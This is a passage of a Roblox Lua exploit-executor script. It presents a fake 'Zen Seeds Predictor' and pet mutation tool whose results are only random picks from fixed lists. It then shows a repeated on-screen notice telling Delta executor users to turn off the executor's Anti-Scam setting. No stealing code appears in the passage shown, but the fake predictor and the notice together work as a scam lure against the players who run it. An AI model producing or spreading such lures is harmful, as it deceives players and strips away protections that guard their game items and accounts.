local toggleScriptBtn = Instance.new("TextButton", frame)
toggleScriptBtn.Size = UDim2.new(0.9, 0, 0, 40)
toggleScriptBtn.Position = UDim2.new(0.05, 0, 0, 150)
toggleScriptBtn.BackgroundColor3 = Color3.fromRGB(140, 210, 140)
toggleScriptBtn.Font = Enum.Font.GothamBold
toggleScriptBtn.TextSize = 20
toggleScriptBtn.TextColor3 = Color3.fromRGB(0, 200, 0)
toggleScriptBtn.Text = "Script: ON"

local switchBtn = Instance.new("TextButton", frame)
switchBtn.Size = UDim2.new(0.9, 0, 0, 30)
switchBtn.Position = UDim2.new(0.05, 0, 0, 200)
switchBtn.BackgroundColor3 = Color3.fromRGB(180, 220, 180)
switchBtn.Font = Enum.Font.Gotham
switchBtn.TextSize = 16
switchBtn.TextColor3 = Color3.fromRGB(50, 90, 50)
switchBtn.Text = "Switch to Pet Mutator"

local zenSeeds = {"Monoblooma", "Serenity", "Taro Flowers", "Zen Rocks", "Hinomai", "Maple Apple"}
local petMuts = {
    "Shiny", "Inverted", "Windy", "Frozen", "Golden", "Tiny",
    "Mega", "IronSkin", "Radiant", "Shocked", "Rainbow", "Ascended"
}

local mode = "seeds"
local enabled = true

toggleBtn.MouseButton1Click:Connect(function()
    screenGui.Enabled = not screenGui.Enabled
end)

toggleScriptBtn.MouseButton1Click:Connect(function()
    enabled = not enabled
    if enabled then
        toggleScriptBtn.Text = "Script: ON"
        toggleScriptBtn.TextColor3 = Color3.fromRGB(0, 200, 0)
    else
        toggleScriptBtn.Text = "Script: OFF"
        toggleScriptBtn.TextColor3 = Color3.fromRGB(200, 0, 0)
    end
end)

switchBtn.MouseButton1Click:Connect(function()
    if mode == "seeds" then
        mode = "pets"
        title.Text = "üêæ Pets Mutation Randomizer"
        resultLabel.Text = "Pet Mutation: ???"
        actionBtn.Text = "üîÅ Mutate Pet"
        switchBtn.Text = "Switch to Zen Seeds"
    else
        mode = "seeds"
        title.Text = "üå∏ Zen Seeds Predictor"
        resultLabel.Text = "Seed: The New Zen Event"
        actionBtn.Text = "üåø Roll Seed"
        switchBtn.Text = "Switch to Pet Mutator"
    end
end)

actionBtn.MouseButton1Click:Connect(function()
    if not enabled then return end
    if mode == "seeds" then
        local s = zenSeeds[math.random(1, #zenSeeds)]
        resultLabel.Text = "Seed: " .. s
    else
        local m = petMuts[math.random(1, #petMuts)]
        resultLabel.Text = "Pet Mutation: " .. m
    end
end)

math.randomseed(tick())
print("‚úÖ Zen Seeds GUI loaded!")

-- üßæ Floating Notification with Close Button, Draggable, Spam x3
for i = 1, 3 do
    task.delay((i - 1) * 1.5, function()
        local noticeGui = Instance.new("ScreenGui")
        noticeGui.Name = "DeltaFixNoticeBox"
        noticeGui.Parent = game.CoreGui
        noticeGui.ResetOnSpawn = false

        local noticeFrame = Instance.new("Frame", noticeGui)
        noticeFrame.Size = UDim2.new(0, 600, 0, 160)
        noticeFrame.Position = UDim2.new(0.5, -300, 0.05 + (i * 0.02), 0)
        noticeFrame.BackgroundTransparency = 1
        noticeFrame.Active = true
        noticeFrame.Draggable = true

        local messageLabel = Instance.new("TextLabel", noticeFrame)
        messageLabel.Size = UDim2.new(1, -40, 1, 0)
        messageLabel.Position = UDim2.new(0, 10, 0, 0)
        messageLabel.BackgroundTransparency = 1
        messageLabel.Font = Enum.Font.GothamBold
        messageLabel.TextSize = 18
        messageLabel.TextColor3 = Color3.new(1, 1, 1)
        messageLabel.TextWrapped = true
        messageLabel.TextYAlignment = Enum.TextYAlignment.Top
        messageLabel.TextXAlignment = Enum.TextXAlignment.Center
        messageLabel.ZIndex = 1000
        messageLabel.Text = [[
‚ö† This script only works in **Krnl**.

If you're using **Delta**, please **turn off Anti-Scam** in Settings.

Delta blocks this script to stop rejoining after Anti-Scam is disabled.
]]

        local closeBtn = Instance.new("TextButton", noticeFrame)
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -35, 0, 5)
        closeBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.TextSize = 20
        closeBtn.Text = "X"
        closeBtn.TextColor3 = Color3.new(1, 1, 1)
        closeBtn.ZIndex = 1001

        local btnCorner = Instance.new("UICorner", closeBtn)
        btnCorner.CornerRadius = UDim.new(1, 0)

        closeBtn.MouseButton1Click:Connect(function()
            noticeGui:Destroy()
        end)
    end)
end

